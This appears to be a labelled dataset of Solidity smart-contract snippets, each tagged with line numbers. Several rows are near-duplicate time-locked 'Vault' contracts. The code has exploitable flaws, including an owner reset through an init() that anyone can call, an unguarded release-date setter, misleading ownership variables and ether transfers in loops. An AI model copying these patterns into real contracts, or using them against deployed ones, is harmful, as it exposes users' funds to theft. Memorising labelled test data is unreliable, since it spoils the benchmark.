          //Check if referral receives eth or tokens
          if(referral[_reff] == true){ //If eth
            //Check current rate
            if(state == State.PRESALE){//Presale Rate
              //100%/10 = 10%
              _reff.transfer(refBase.div(10));
              totalEthRefDistributed = totalEthRefDistributed.add(refBase.div(10));
            } else {//Mainsale rate
              //100%/20= 5%
              _reff.transfer(refBase.div(20));
              totalEthRefDistributed = totalEthRefDistributed.add(refBase.div(20));
            }
          } else {//if tokens
            //Check current rate
            if(state == State.PRESALE){//Presale Rate
              //100%/10 = 10%
              tokenReward.transfer(_reff,tokenBought.div(10));
              totalRefDistributed = totalRefDistributed.add(tokenBought.div(10));
            } else {//Mainsale rate
              //100%/20= 5%
              tokenReward.transfer(_reff,tokenBought.div(20));
              totalRefDistributed = totalRefDistributed.add(tokenBought.div(20));
            }
          }
        }
        emit LogFundingReceived(user, msg.value, totalRaised, _reff); //Log the purchase
        fundsWallet.transfer(address(this).balance); //Eth is send to fundsWallet
        emit LogBeneficiaryPaid(fundsWallet); //Log transaction
        checkIfFundingCompleteOrExpired(); //Execute state checks
    }
    /**
    * @notice tokenBought calculation function
    * @param _value is the amount of eth multiplied by 1e18",[64]
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
//
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.17;
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract Token {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint amount) constant public returns (bool);
}
// tokens are withdrawable
contract TokenVault is Ownable {
    event TokenTransfer(address indexed to, address token, uint amount);
    function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
        uint amount = Token(token).balanceOf(address(this));
        if (amount > 0) {
            TokenTransfer(to, token, amount);
            return Token(token).transfer(to, amount);
        }
        return false;
    }
}
// store ether & tokens for a period of time
contract Vault is TokenVault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}","[50, 69]"
"    ///  contract
    function () payable {
        receiveEther();
    }
////////
// Spender Interface
////////
    /// @notice only `allowedSpenders[]` Creates a new `Payment`
    /// @param _name Brief description of the payment that is authorized
    /// @param _reference External reference of the payment
    /// @param _recipient Destination of the payment
    /// @param _amount Amount to be paid in wei
    /// @param _paymentDelay Number of seconds the payment is to be delayed, if
    ///  this value is below `timeLock` then the `timeLock` determines the delay
    /// @return The Payment ID number for the new authorized payment
    function authorizePayment(
        string _name,
        bytes32 _reference,
        address _recipient,
        uint _amount,
        uint _paymentDelay
    ) returns(uint) {
        // Fail if you arent on the `allowedSpenders` white list
        if (!allowedSpenders[msg.sender] ) throw;
        uint idPayment = authorizedPayments.length;       // Unique Payment ID
        authorizedPayments.length++;
        // The following lines fill out the payment struct
        Payment p = authorizedPayments[idPayment];
        p.spender = msg.sender;
        // Overflow protection
        if (_paymentDelay > 10**18) throw;
        // Determines the earliest the recipient can receive payment (Unix time)
        p.earliestPayTime = _paymentDelay >= timeLock ?
                                now + _paymentDelay :
                                now + timeLock;
        p.recipient = _recipient;
        p.amount = _amount;
        p.name = _name;
        p.reference = _reference;
        PaymentAuthorized(idPayment, p.recipient, p.amount);
        return idPayment;
    }
    /// @notice only `allowedSpenders[]` The recipient of a payment calls this
    ///  function to send themselves the ether after the `earliestPayTime` has
    ///  expired
    /// @param _idPayment The payment ID to be executed
    function collectAuthorizedPayment(uint _idPayment) {
        // Check that the `_idPayment` has been added to the payments struct
        if (_idPayment >= authorizedPayments.length) throw;
        Payment p = authorizedPayments[_idPayment];
        // Checking for reasons not to execute the payment
        if (msg.sender != p.recipient) throw;
        if (!allowedSpenders[p.spender]) throw;
        if (now < p.earliestPayTime) throw;
        if (p.canceled) throw;
        if (p.paid) throw;
        if (this.balance < p.amount) throw;
        p.paid = true; // Set the payment to being paid
        if (!p.recipient.send(p.amount)) {  // Make the payment
            throw;
        }
        PaymentExecuted(_idPayment, p.recipient, p.amount);
     }
/////////
// SecurityGuard Interface
/////////
    /// @notice `onlySecurityGuard` Delays a payment for a set number of seconds
    /// @param _idPayment ID of the payment to be delayed
    /// @param _delay The number of seconds to delay the payment
    function delayPayment(uint _idPayment, uint _delay) onlySecurityGuard {
        if (_idPayment >= authorizedPayments.length) throw;
        // Overflow test
        if (_delay > 10**18) throw;
        Payment p = authorizedPayments[_idPayment];
        if ((p.securityGuardDelay + _delay > maxSecurityGuardDelay) ||
            (p.paid) ||
            (p.canceled))
            throw;
        p.securityGuardDelay += _delay;
        p.earliestPayTime += _delay;
    }
////////
// Owner Interface
///////
    /// @notice `onlyOwner` Cancel a payment all together
    /// @param _idPayment ID of the payment to be canceled.
    function cancelPayment(uint _idPayment) onlyOwner {
        if (_idPayment >= authorizedPayments.length) throw;
        Payment p = authorizedPayments[_idPayment];
        if (p.canceled) throw;
        if (p.paid) throw;
        p.canceled = true;
        PaymentCanceled(_idPayment);
    }
    /// @notice `onlyOwner` Adds a spender to the `allowedSpenders[]` white list
    /// @param _spender The address of the contract being authorized/unauthorized
    /// @param _authorize `true` if authorizing and `false` if unauthorizing
    function authorizeSpender(address _spender, bool _authorize) onlyOwner {
        allowedSpenders[_spender] = _authorize;
        SpenderAuthorization(_spender, _authorize);
    }
    /// @notice `onlyOwner` Sets the address of `securityGuard`
    /// @param _newSecurityGuard Address of the new security guard
    function setSecurityGuard(address _newSecurityGuard) onlyOwner {
        securityGuard = _newSecurityGuard;
    }
    /// @notice `onlyOwner` Changes `timeLock`; the new `timeLock` cannot be
    ///  lower than `absoluteMinTimeLock`
    /// @param _newTimeLock Sets the new minimum default `timeLock` in seconds;
    ///  pending payments maintain their `earliestPayTime`
    function setTimelock(uint _newTimeLock) onlyOwner {
        if (_newTimeLock < absoluteMinTimeLock) throw;
        timeLock = _newTimeLock;
    }
    /// @notice `onlyOwner` Changes the maximum number of seconds
    /// `securityGuard` can delay a payment
    /// @param _maxSecurityGuardDelay The new maximum delay in seconds that
    ///  `securityGuard` can delay the payment's execution in total
    function setMaxSecurityGuardDelay(uint _maxSecurityGuardDelay) onlyOwner {
        maxSecurityGuardDelay = _maxSecurityGuardDelay;
    }
}","[54, 75]"
"pragma solidity ^0.4.17;
contract Vault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event TransferOwnership(address indexed from, address indexed to);
    address Owner;
    function transferOwnership(address to) public onlyOwner {
        TransferOwnership(Owner, to); Owner = to;
    }
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }
    function SetReleaseDate(uint NewDate) {
        Date = NewDate;
    }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function withdraw(uint amount) public payable { withdrawTo(msg.sender, amount); }
    function withdrawTo(address to, uint amount) public onlyOwner {
        if (WithdrawalEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
    function lock() public { Locked = true; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    modifier open { if (!Locked) _; }
    function kill() { require(this.balance == 0); selfdestruct(Owner); }
}","[27, 47]"
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
//
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.18;
// minimum token interface
contract Token {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint amount) public returns (bool);
}
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
// tokens are withdrawable
contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
    function withdrawToken(address token) public returns (bool) {
        address self = address(this);
        return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));
    }
    function emtpyTo(address token, address to) public returns (bool) {
        address self = address(this);
        return withdrawTokenTo(token, to, Token(token).balanceOf(self));
    }
}
// store ether & tokens for a period of time
contract Vault is TokenVault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}","[53, 72]"
"pragma solidity ^0.4.18;
contract Vault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event TransferOwnership(address indexed from, address indexed to);
    address Owner;
    function transferOwnership(address to) public onlyOwner {
        TransferOwnership(Owner, to); Owner = to;
    }
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.1 ether;
        Locked = false;
        deposit();
    }
    function SetReleaseDate(uint NewDate) {
        Date = NewDate;
    }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function withdraw(uint amount) public payable { withdrawTo(msg.sender, amount); }
    function withdrawTo(address to, uint amount) public onlyOwner {
        if (WithdrawalEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
    function lock() public { Locked = true; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    modifier open { if (!Locked) _; }
    function kill() { require(this.balance == 0); selfdestruct(Owner); }
}","[27, 47]"
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
// https://www.haloplatform.tech/
// 
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit:
//
//      https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.17;
contract Ownable {
    address Owner;
    function Ownable() { Owner = msg.sender; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract Token {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint amount) constant public returns (bool);
}
// tokens are withdrawable
contract TokenVault is Ownable {
    address owner;
    event TokenTransfer(address indexed to, address token, uint amount);
    function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
        uint amount = balanceOfToken(token);
        if (amount > 0) {
            TokenTransfer(to, token, amount);
            return Token(token).transfer(to, amount);
        }
        return false;
    }
    function balanceOfToken(address token) public constant returns (uint256 bal) {
        bal = Token(token).balanceOf(address(this));
    }
}
// store ether & tokens for a period of time
contract Vault is TokenVault {
    string public constant version = ""v1.1"";
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 1 ether;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { if(Locked) revert(); Locked = true; }
    modifier open { if (!Locked) _; owner = msg.sender; deposit(); }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}","[58, 77]"
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
//
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
pragma solidity ^0.4.18;
// minimum token interface
contract Token {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint amount) public returns (bool);
}
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
// tokens are withdrawable
contract TokenVault is Ownable {
    address self = address(this);
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
    function withdrawToken(address token) public returns (bool) {
        return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));
    }
    function emtpyTo(address token, address to) public returns (bool) {
        return withdrawTokenTo(token, to, Token(token).balanceOf(self));
    }
}
// store ether & tokens for a period of time
contract Vault is TokenVault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function initVault() payable open {
        Owner = msg.sender;
        minDeposit = 0.25 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function lock() public { Locked = true; } address inited;
    modifier open { if (!Locked) _; inited = msg.sender; }
    function kill() { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return inited; }
}","[51, 70]"
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
//
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.16;
// minimum token interface
contract Token {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint amount) public returns (bool);
}
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
// tokens are withdrawable
contract TokenVault is Ownable {
    address self = address(this);
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
    function withdrawToken(address token) public returns (bool) {
        return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));
    }
    function emtpyTo(address token, address to) public returns (bool) {
        return withdrawTokenTo(token, to, Token(token).balanceOf(self));
    }
}
// store ether & tokens for a period of time
contract Vault is TokenVault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}","[52, 71]"
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
//
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.14;
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
// tokens are withdrawable
contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return token.call(bytes4(0xa9059cbb), to, amount);
    }
}
// store ether & tokens for a period of time
contract Vault is TokenVault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}","[40, 59]"
"     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    function Ownable() public {
        owner = msg.sender;
    }
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param newOwner The address to transfer ownership to.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}
interface token {
    function transfer(address receiver, uint amount) public;
}
contract VesaPreICO is Ownable {
    using SafeMath for uint256;
    using SafeBonus for uint256;
    address public beneficiary;
    uint8 public constant durationInDays = 31;
    uint public constant fundingGoal = 140 ether;
    uint public constant fundingGoalHardCap = 1400 ether;
    uint public amountRaised;
    uint public start;
    uint public deadline;
    uint public constant bonusPrice = 1857142857000000;
    uint public constant bonusPriceDeltaPerHour = 28571428570000;
    uint public constant bonusPeriodDurationInHours = 10;
    uint public constant price = 2142857142857140;
    uint public constant minSum = 142857142900000000;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool public fundingGoalReached = false;
    bool public crowdsaleClosed = false;
    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);
    /**
     * Constrctor function
     *
     * Setup the owner
     */
    function VesaPreICO() public {
        beneficiary = 0x94e1F1Fa284061184B583a61633CaC75e03cFdBC;
        start = now;
        deadline = start + durationInDays * 1 days;
        tokenReward = token(0xb1c74c1D82824428e484072069041deD079eD921);
    }
    function isAfterDeadline() internal view returns (bool) { return now >= deadline; }
    function isSoftCapAchieved() internal view returns (bool) { return amountRaised >= fundingGoal; }
    function isHardCapAchieved() internal view returns (bool) { return amountRaised >= fundingGoalHardCap; }
    function isCompanyCanBeFinished() internal view returns (bool) { return isAfterDeadline() || isHardCapAchieved(); }
    modifier afterDeadline() { if (isAfterDeadline()) _; }
    modifier companyCanBeFinished() { if (isCompanyCanBeFinished()) _; }
    function getPrice() public view returns (uint) {
        require(!crowdsaleClosed);
        if ( now >= (start + bonusPeriodDurationInHours.mul(1 hours))) {
            return price;
        } else {
            uint hoursLeft = now.sub(start).div(1 hours);
            return bonusPrice.add(bonusPriceDeltaPerHour.mul(hoursLeft));
        }
    }
    function getBonus(uint amount) public view returns (uint) {
        require(!crowdsaleClosed);
        if (amount < 2857142857000000000) { return 0; }                                       // < 2.857142857
        if (amount >= 2857142857000000000 && amount < 7142857143000000000) { return 6; }      // 2.857142857-7,142857143 ETH
        if (amount >= 7142857143000000000 && amount < 14285714290000000000) { return 8; }     // 7,142857143-14,28571429 ETH
        if (amount >= 14285714290000000000 && amount < 25000000000000000000) { return 10; }   // 14,28571429-25 ETH
        if (amount >= 25000000000000000000 && amount < 85000000000000000000) { return 15; }   // 25-85 ETH
        if (amount >= 85000000000000000000 && amount < 285000000000000000000) { return 17; }  // 85-285 ETH
        if (amount >= 285000000000000000000) { return 20; }                                   // >285 ETH
    }
    /**
     * Fallback function
     *
     * The function without name is the default function that is called whenever anyone sends funds to a contract
     */
    function () public payable {
        require(!crowdsaleClosed);
        require(msg.value > minSum);
        uint amount = msg.value;
        balanceOf[msg.sender].add(amount);
        amountRaised = amountRaised.add(amount);
        uint currentPrice = getPrice();
        uint currentBonus = getBonus(amount);
        uint tokensToTransfer = amount.mul(10 ** 18).div(currentPrice);
        uint tokensToTransferWithBonuses = tokensToTransfer.addBonus(currentBonus);
        tokenReward.transfer(msg.sender, tokensToTransferWithBonuses);
        FundTransfer(msg.sender, amount, true);
    }
    /**
     * Check if goal was reached
     *
     * Checks if the goal or time limit has been reached and ends the campaign
     */
    function checkGoalReached() public companyCanBeFinished {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }
    /**
     * Withdraw the funds
     *
     * Checks to see if goal or time limit has been reached, and if so, and the funding goal was reached,
     * sends the entire amount to the beneficiary. If goal was not reached, each contributor can withdraw
     * the amount they contributed.
     */
    function safeWithdrawal() public companyCanBeFinished {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {","[59, 67, 70]"
"    uint256 buttonPriceStep = 2000000000000000;
    //
    // Mapping for the players
    //
    struct Player {
        address playerAddress;                              // We save the address of the player
        uint countVTL;                                      // The count of VTL Tokens (should be the same as the count of presses)
    }
    Player[] players;
    mapping (address => uint) public playersToId;      // We map the player address to its id to make it easier to retrieve
    //
    // Core
    //
    // This function is called when a player sends ETH directly to the contract
    function() public payable {
        // We calculate the correct amount of presses
        uint _countPress = msg.value / getButtonPrice();
        // We call the function
        Press(_countPress, 0);
    }
    // We use this function to initially fund the contract
    function FundContract() public payable {
    }
    // This function is being called when a user presses the button on the website (or call it directly from the contract)
    function Press(uint _countPresses, uint _affId) public payable {
        // We verify that the _countPress value is not < 1
        require(_countPresses >= 1);
        // We double check that the players aren't trying to send small amount of ETH to press the button
        require(msg.value >= buttonBasePrice);
        // We verify that the game is not finished.
        require(timerEnd > now);
        // We verify that the value paid is correct.
        uint256 _buttonPrice = getButtonPrice();
        require(msg.value >= safeMultiply(_buttonPrice, _countPresses));
        // Process the button press
        timerEnd = uint32(now + timerInterval);
        winningAddress = msg.sender;
        // Transfer the commissions to affiliate, investor, pot and dev
        uint256 TwoPercentCom = (msg.value / 100) * 2;
        uint256 TenPercentCom = msg.value / 10;
        uint256 FifteenPercentCom = (msg.value / 100) * 15;
        // Commission #1. Affiliate
        if(_affId > 0 && _affId < players.length) {
            // If there is an affiliate we transfer his commission otherwise we keep the commission in the pot
            players[_affId].playerAddress.transfer(TenPercentCom);
        }
        // Commission #2. Main investor
        uint[] memory mainInvestors = GetMainInvestor();
        uint mainInvestor = mainInvestors[0];
        players[mainInvestor].playerAddress.transfer(FifteenPercentCom);
        countInvestorDividends = countInvestorDividends + FifteenPercentCom;
        // Commission #3. 2 to 10 main investors
        // We loop through all of the top 10 investors and send them their commission
        for(uint i = 1; i < mainInvestors.length; i++) {
            if(mainInvestors[i] != 0) {
                uint _investorId = mainInvestors[i];
                players[_investorId].playerAddress.transfer(TwoPercentCom);
                countInvestorDividends = countInvestorDividends + TwoPercentCom;
            }
        }
        // Commission #4. Dev
        cfoAddress.transfer(FifteenPercentCom);
        // Update or create the player and issue the VTL Tokens
        if(playersToId[msg.sender] > 0) {
            // Player exists, update data
            players[playersToId[msg.sender]].countVTL = players[playersToId[msg.sender]].countVTL + _countPresses;
        } else {
            // Player doesn't exist create it
            uint playerId = players.push(Player(msg.sender, _countPresses)) - 1;
            playersToId[msg.sender] = playerId;
        }
        // Send event
        emit NewPress(msg.sender, _countPresses, msg.value, timerEnd);
        // Increment the total count of presses
        countPresses = countPresses + _countPresses;
        amountPlayed = amountPlayed + msg.value;
    }
    // This function can be called only by the winner once the timer has ended
    function withdrawReward() public {
        // We verify that the game has ended and that the address asking for the withdraw is the winning address
        require(timerEnd < now);
        require(winningAddress == msg.sender);
        // Send the balance to the winning player
        winningAddress.transfer(address(this).balance);
    }
    // This function returns the details for the players by id (instead of by address)
    function GetPlayer(uint _id) public view returns(address, uint) {
        return(players[_id].playerAddress, players[_id].countVTL);
    }
    // Return the player id and the count of VTL for the connected player
    function GetPlayerDetails(address _address) public view returns(uint, uint) {
        uint _playerId = playersToId[_address];
        uint _countVTL = 0;
        if(_playerId > 0) {
            _countVTL = players[_playerId].countVTL;
        }
        return(_playerId, _countVTL);
    }
    // We loop through all of the players to get the main investor (the one with the largest amount of VTL Token)
    function GetMainInvestor() public view returns(uint[]) {
        uint depth = 10;
        bool[] memory _checkPlayerInRanking = new bool[] (players.length);
        uint[] memory curWinningVTLAmount = new uint[] (depth);
        uint[] memory curWinningPlayers = new uint[] (depth);
        // Loop through the depth to find the player for each rank
        for(uint j = 0; j < depth; j++) {
            // We reset some value
            curWinningVTLAmount[j] = 0;
            // We loop through all of the players
            for (uint8 i = 0; i < players.length; i++) {
                // Iterate through players and insert the current best at the correct position
                if(players[i].countVTL > curWinningVTLAmount[j] && _checkPlayerInRanking[i] != true) {
                    curWinningPlayers[j] = i;
                    curWinningVTLAmount[j] = players[i].countVTL;
                }
            }
            // We record that this player is in the ranking to make sure we don't integrate it multiple times in the ranking
            _checkPlayerInRanking[curWinningPlayers[j]] = true;
        }
        // We return the winning player
        return(curWinningPlayers);
    }
    // This function returns the current important stats of the game such as the timer, current balance and current winner, the current press prices...
    function GetCurrentNumbers() public view returns(uint, uint256, address, uint, uint256, uint256, uint256) {
        return(timerEnd, address(this).balance, winningAddress, countPresses, amountPlayed, getButtonPrice(), countInvestorDividends);
    }
    // This is the initial function called when we create the contract
    constructor() public onlyCeo {","[45, 50, 57, 62, 81, 84]"
"pragma solidity ^0.4.25;
